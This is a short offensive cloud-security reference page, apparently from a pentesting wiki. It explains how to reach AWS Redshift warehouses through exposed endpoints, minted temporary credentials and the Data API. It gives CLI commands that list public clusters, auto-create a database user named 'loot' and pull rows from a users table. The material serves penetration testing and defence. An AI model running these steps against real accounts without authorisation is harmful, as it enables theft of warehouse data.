---
title: "Redshift: reaching the warehouse through temporary credentials and exposure"
description: "Accessing Redshift clusters through exposed endpoints, temporary credentials, and over-broad database grants."
keywords:
  - Redshift
  - cluster
  - GetClusterCredentials
  - database
  - data warehouse
---

# Redshift

Redshift is the data warehouse, so it concentrates exactly the data worth taking. A principal with `redshift:GetClusterCredentials` mints a temporary database user and password for a cluster, auto-creating the user where allowed, which turns an IAM foothold into warehouse access without any stored password. Publicly accessible clusters with loose security groups are reachable directly, and the Redshift Data API runs SQL through the control plane alone.

## Minting credentials and connecting

```bash
aws redshift describe-clusters \
  --query 'Clusters[?PubliclyAccessible==`true`].[ClusterIdentifier,Endpoint.Address]'

aws redshift get-cluster-credentials \
  --cluster-identifier <c> --db-user loot --auto-create --db-name dev
psql "host=<ep> port=5439 dbname=dev user=IAM:loot password=<temp>"
```

## Querying through the Data API

```bash
aws redshift-data execute-statement --cluster-identifier <c> \
  --database dev --sql 'select * from users limit 100'
aws redshift-data get-statement-result --id <stmt-id>
```

## Exploitation notes

- `GetClusterCredentials` with `--auto-create` and a broad `DbGroups` grant can land you in a privileged database group.
- The Data API needs no network path to the cluster, only IAM, so it works from anywhere the credentials do.
- Redshift Spectrum reads S3 through external schemas, extending access to lake data referenced by the warehouse.

## Tools

- **AWS CLI** (`redshift get-cluster-credentials`, `redshift-data execute-statement`).
- **psql**: native client once credentials are minted.

## References

- [AWS: GetClusterCredentials](https://docs.aws.amazon.com/redshift/latest/APIReference/API_GetClusterCredentials.html)
- [HackTricks Cloud: AWS Redshift](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [CloudFox: enumerating reachable warehouses and data stores](https://github.com/BishopFox/cloudfox)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
